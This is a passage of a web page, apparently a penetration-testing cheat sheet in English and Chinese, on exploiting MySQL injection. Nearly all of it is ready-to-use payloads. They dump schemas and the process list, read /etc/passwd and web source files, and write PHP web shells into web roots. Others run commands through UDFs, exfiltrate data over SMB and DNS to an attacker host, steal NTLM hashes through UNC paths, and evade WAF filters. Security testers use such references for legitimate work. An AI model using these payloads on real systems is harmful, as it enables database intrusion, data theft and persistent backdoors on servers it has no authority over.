class="number">0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e</span>,@<span class="variable">@GLOBAL</span>.have_symlink,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e</span>,@<span class="variable">@GLOBAL</span>.have_ssl,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e</span>,@<span class="variable">@basedir</span>,<span class="number">0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e</span>,(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>)<span class="comment">/*!13337from*/</span>(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>)<span class="comment">/*!13337from*/</span>(information_schema.columns)<span class="comment">/*!13337where*/</span>(table_schema<span class="operator">!=</span><span class="number">0x696e666f726d6174696f6e5f736368656d61</span>)<span class="keyword">and</span>(<span class="variable">@a</span>)<span class="keyword">in</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="comment">/*!13337concat*/</span>(<span class="variable">@a</span>,table_schema,<span class="number">0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e</span>,table_name,<span class="number">0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e</span>,column_name,<span class="number">0x3c62723e</span>))))a))<span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sharik</span></span><br><span class="line">(<span class="keyword">select</span>(<span class="variable">@a</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(<span class="variable">@a</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_schema<span class="operator">!=</span><span class="number">0x696e666f726d6174696f6e5f736368656d61</span>)<span class="keyword">and</span>(<span class="variable">@a</span>)<span class="keyword">in</span>(<span class="variable">@a</span>:<span class="operator">=</span>concat(<span class="variable">@a</span>,table_name,<span class="number">0x203a3a20</span>,column_name,<span class="number">0x3c62723e</span>))))a)</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Current-queries"><a href="#MYSQL-Current-queries" class="headerlink" title="MYSQL Current queries"></a>MYSQL Current queries</h2><p>This table can list all operations that DB is performing at the moment.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,state,info,<span class="number">4</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.PROCESSLIST #</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Dump in one shot example for the table content.</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span>(@)<span class="keyword">from</span>(<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(@)<span class="keyword">from</span>(information_schema.processlist)<span class="keyword">where</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3C62723E</span>,state,<span class="number">0x3a</span>,</span><br></pre></td></tr></table></figure>

<h2 id="MYSQL-Read-content-of-a-file"><a href="#MYSQL-Read-content-of-a-file" class="headerlink" title="MYSQL Read content of a file"></a>MYSQL Read content of a file</h2><p>Need the filepriv, otherwise you will get the error : ERROR 1290 (HY000): The MySQL server is running with the –secure-file-priv option so it cannot execute this statement</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION ALL SELECT LOAD_FILE(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;) --</span></span><br><span class="line"><span class="string">UNION ALL SELECT TO_base64(LOAD_FILE(&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>index.php<span class="string">&#x27;));</span></span><br></pre></td></tr></table></figure>
<p>If you are root on the database, you can re-enable the LOAD_FILE using the following query</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> FILE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>; FLUSH PRIVILEGES;#</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Write-a-shell"><a href="#MYSQL-Write-a-shell" class="headerlink" title="MYSQL Write a shell"></a>MYSQL Write a shell</h2><h3 id="Into-outfile-method"><a href="#Into-outfile-method" class="headerlink" title="Into outfile method"></a>Into outfile method</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:\\xampp\\htdocs\\backdoor.php&quot;</span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/x.php&#x27;</span> FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">0x3c3f70687020706870696e666f28293b203f3e</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:\\wamp\\www\\pwnd.php&#x27;</span><span class="comment">-- -</span></span><br><span class="line">[...] <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,&quot;&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;&quot;,<span class="number">6</span> <span class="keyword">into</span> OUTFILE <span class="string">&#x27;c:/inetpub/wwwroot/backdoor.php&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Into-dumpfile-method"><a href="#Into-dumpfile-method" class="headerlink" title="Into dumpfile method"></a>Into dumpfile method</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span>xPHP_PAYLOAD_IN_HEX, <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;C:/Program Files/EasyPHP-12.1/www/shell.php&#x27;</span></span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/images/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="MYSQL-Fast-Exploitation"><a href="#MYSQL-Fast-Exploitation" class="headerlink" title="MYSQL Fast Exploitation"></a>MYSQL Fast Exploitation</h2><p>Requirement: MySQL &gt;&#x3D; 5.7.22</p>
<p>Use json_arrayagg() instead of group_concat() which allows less symbols to be displayed</p>
<ul>
<li>group_concat() &#x3D; 1024 symbols</li>
<li>json_arrayagg() &gt; 16,000,000 symbols<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">json_arrayagg</span>(concat_ws(<span class="number">0x3a</span>,table_schema,table_name)) <span class="keyword">from</span> INFORMATION_SCHEMA.TABLES;</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-UDF-command-execution"><a href="#MYSQL-UDF-command-execution" class="headerlink" title="MYSQL UDF command execution"></a>MYSQL UDF command execution</h2>First you need to check if the UDF are installed on the server.</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ whereis lib_mysqludf_sys.so</span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
<p>Then you can use functions such as sys_exec and sys_eval.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ mysql <span class="operator">-</span>u root <span class="operator">-</span>p mysql</span><br><span class="line">Enter password: [...]</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval(<span class="string">&#x27;id&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> uid<span class="operator">=</span><span class="number">118</span>(mysql) gid<span class="operator">=</span><span class="number">128</span>(mysql) <span class="keyword">groups</span><span class="operator">=</span><span class="number">128</span>(mysql) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
<h1 id="MYSQL-Out-of-band"><a href="#MYSQL-Out-of-band" class="headerlink" title="MYSQL Out of band"></a>MYSQL Out of band</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">into</span> outfile <span class="string">&#x27;\\\\192.168.0.100\\temp\\out.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;\\\\192.168.0.100\\temp\\out.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="DNS-exfiltration"><a href="#DNS-exfiltration" class="headerlink" title="DNS exfiltration"></a>DNS exfiltration</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,version(),<span class="string">&#x27;.hacker.site\\a.txt&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> load_file(concat(<span class="number">0x5c5c5c5c</span>,version(),<span class="number">0x2e6861636b65722e736974655c5c612e747874</span>))</span><br></pre></td></tr></table></figure>
<h3 id="UNC-Path-NTLM-hash-stealing"><a href="#UNC-Path-NTLM-hash-stealing" class="headerlink" title="UNC Path - NTLM hash stealing"></a>UNC Path - NTLM hash stealing</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;\\\\error\\abc&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> load_file(<span class="number">0x5c5c5c5c6572726f725c5c616263</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;osanda&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;\\\\error\\abc&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;osanda&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;\\\\error\\abc&#x27;</span>;</span><br><span class="line">load data infile <span class="string">&#x27;\\\\error\\abc&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> database.table_name;</span><br></pre></td></tr></table></figure>

<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><strong>Learn here different options to</strong> <a href="mysql-ssrf.md"><strong>abuse a Mysql injection to obtain a SSRF</strong></a><strong>.</strong></p>
<h2 id="WAF-bypass-tricks"><a href="#WAF-bypass-tricks" class="headerlink" title="WAF bypass tricks"></a>WAF bypass tricks</h2><h3 id="Information-schema-alternatives"><a href="#Information-schema-alternatives" class="headerlink" title="Information_schema alternatives"></a>Information_schema alternatives</h3><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute <em><strong>information_schema.tables</strong></em> for <em><strong>mysql.innodb_table_stats</strong></em>** ** or for <em><strong>sys.x$schema_flattened_keys</strong></em> or for <strong>sys.schema_table_statistics</strong></p>
<p><img src="/../../../.gitbook/assets/image%20(154).png"></p>
<p><img src="/../../../.gitbook/assets/image%20(155).png"></p>
<h3 id="MySQLinjection-without-COMMAS"><a href="#MySQLinjection-without-COMMAS" class="headerlink" title="MySQLinjection without COMMAS"></a>MySQLinjection without COMMAS</h3><p>Select 2 columns without using any comma (<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma">https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma</a>):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#</span><br></pre></td></tr></table></figure>

<p>使用 OFFSET、FROM 和 JOIN 绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span>         <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br><span class="line">SUBSTR(<span class="string">&#x27;SQL&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">-</span><span class="operator">&gt;</span> SUBSTR(<span class="string">&#x27;SQL&#x27;</span> <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>).</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>)c <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">4</span>)d</span><br></pre></td></tr></table></figure>

<p><code>IF</code> 语句中等号被过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">case</span> <span class="keyword">when</span></span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> finecms.fn_member <span class="keyword">where</span> uid <span class="operator">=</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> +----------------------------------+</span></span><br><span class="line"><span class="comment">  | password                         |</span></span><br><span class="line"><span class="comment">  +----------------------------------+</span></span><br><span class="line"><span class="comment">  | ac7cd59472be180b81c7551b92925f03 |</span></span><br><span class="line"><span class="comment">  +----------------------------------+</span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure>

<h3 id="Extract-columns-name-without-information-schema"><a href="#Extract-columns-name-without-information-schema" class="headerlink" title="Extract columns name without information_schema"></a>Extract columns name without information_schema</h3><p><strong>Method for MySQL &gt;&#x3D; 4.1.</strong></p>
<p>First extract the column number with</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">and</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> db.users)<span class="operator">=</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment">-- Operand should contain 4 column(s)</span></span><br></pre></td></tr></table></figure>
<p><strong>Then extract the column name.</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>) <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> db.users <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> LIMIT <span class="number">1</span>)</span><br><span class="line"><span class="comment">--Column &#x27;id&#x27; cannot be null</span></span><br></pre></td></tr></table></figure>

<p>Method for MySQL 5</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#同表相加查询，由于字段重复，会导致报错泄露字段名，同时通过 <span class="keyword">using</span> 函数可忽略联表查询中相同的字段，从而可通过该方式结合MySQL报错信息一个接一个泄露字段名</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b)a</span><br><span class="line"><span class="comment">--#1060 - Duplicate column name &#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b <span class="keyword">USING</span>(id))a</span><br><span class="line"><span class="comment">-- #1060 - Duplicate column name &#x27;name&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b <span class="keyword">USING</span>(id,name))a</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="Retrieving-values-without-the-column-name"><a href="#Retrieving-values-without-the-column-name" class="headerlink" title="Retrieving values without the column name"></a>Retrieving values without the column name</h3><p>If at some point you know the name of the table but you don’t know the name of the columns inside the table, you can try to find how may columns are there executing something like:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># When a True is returned, you have found the number of columns</span></span><br><span class="line">select (select <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>) = (SELECT * from demo <span class="built_in">limit</span> 1);     <span class="comment"># 2columns</span></span><br><span class="line">select (select <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>) &lt; (SELECT * from demo <span class="built_in">limit</span> 1); <span class="comment"># 3columns</span></span><br></pre></td></tr></table></figure>

<p>Supposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># When True, you found the correct char and can start ruteforcing the next position</span></span><br><span class="line">select (select 1, <span class="string">&#x27;flaf&#x27;</span>) = (SELECT * from demo <span class="built_in">limit</span> 1);</span><br></pre></td></tr></table></figure>

<p>其他获取字段值的方式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 这是一个包含 <span class="number">3</span> 列的<span class="keyword">sql</span>注入示例，将提取 dome 表的第三个字段,第一行的值</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , F<span class="number">.3</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> demo limit <span class="number">1</span>,<span class="number">2</span>)F;</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> ,`<span class="number">3</span>` <span class="keyword">FROM</span> ( <span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> demo limit <span class="number">1</span>,<span class="number">2</span>) F;</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> a<span class="number">.2</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> runoob_tbl)a limit <span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>或者如果目标系统支持堆叠注入，可以通过使用以下方式绕过限制（<code>column</code> ，<code>_</code> ， <code>information</code>，<code>select</code> 等）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">78.46</span><span class="number">.224</span><span class="number">.75</span><span class="operator">/</span>quote<span class="operator">/</span><span class="number">2</span>;<span class="keyword">SET</span><span class="operator">%</span><span class="number">0</span>D<span class="variable">@sql</span><span class="operator">%</span><span class="number">3</span>d0x444f20736c656570283529;<span class="keyword">PREPARE</span><span class="operator">%</span><span class="number">0</span>Dquery<span class="operator">%</span><span class="number">0</span>DFROM<span class="operator">%</span><span class="number">0</span>D<span class="variable">@sql</span>;<span class="keyword">EXECUTE</span><span class="operator">%</span><span class="number">0</span>Dquery</span><br><span class="line"></span><br><span class="line"># <span class="keyword">SQL</span>语句原型：</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> <span class="number">0x444f20736c656570283529</span>; # DO sleep(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">PREPARE</span> query <span class="keyword">FROM</span> <span class="variable">@sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> query;</span><br></pre></td></tr></table></figure>

<p>More info in <a target="_blank" rel="noopener" href="https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952">https:&#x2F;&#x2F;medium.com&#x2F;@terjanq&#x2F;blind-sql-injection-without-an-in-1e14ba1d4952</a></p>
<h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><p><strong>大写&#x2F;小写绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p><strong>等效运算符绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span>   <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&amp;&amp;</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">26</span></span><br><span class="line"><span class="keyword">OR</span>    <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">||</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">%</span><span class="number">7</span>C<span class="operator">%</span><span class="number">7</span>C</span><br><span class="line"><span class="operator">=</span>     <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">LIKE</span>,REGEXP,RLIKE, <span class="keyword">not</span> <span class="operator">&lt;</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&gt;</span> X   <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">not</span> <span class="keyword">between</span> <span class="number">0</span> <span class="keyword">and</span> X</span><br><span class="line"><span class="keyword">WHERE</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="comment">--&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))</span></span><br></pre></td></tr></table></figure>
<p><strong><code>select x</code> 绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># [<span class="operator">+</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">+</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="operator">-</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">-</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [@]</span><br><span class="line"><span class="keyword">select</span><span class="variable">@x</span> <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="operator">!</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">!</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">select&#x27;</span>x<span class="string">&#x27; from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [&quot;]</span></span><br><span class="line"><span class="string">select&quot;x&quot; from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [~]</span></span><br><span class="line"><span class="string">select~x from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [&#123;&#125;]</span></span><br><span class="line"><span class="string">select&#123;xxx x&#125; from y</span></span><br><span class="line"><span class="string">select&#123;xxx `x`&#125; from y</span></span><br><span class="line"><span class="string">select&#123;xxx `x`&#125;,.7from&#123;x `dbname`.`tablename`&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong><code>union select x</code> 绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># \N 绕过</span><br><span class="line"><span class="keyword">select</span> \N; # 代表<span class="keyword">null</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,\N;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,\Nfrom users;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">union</span> <span class="keyword">distinct</span> <span 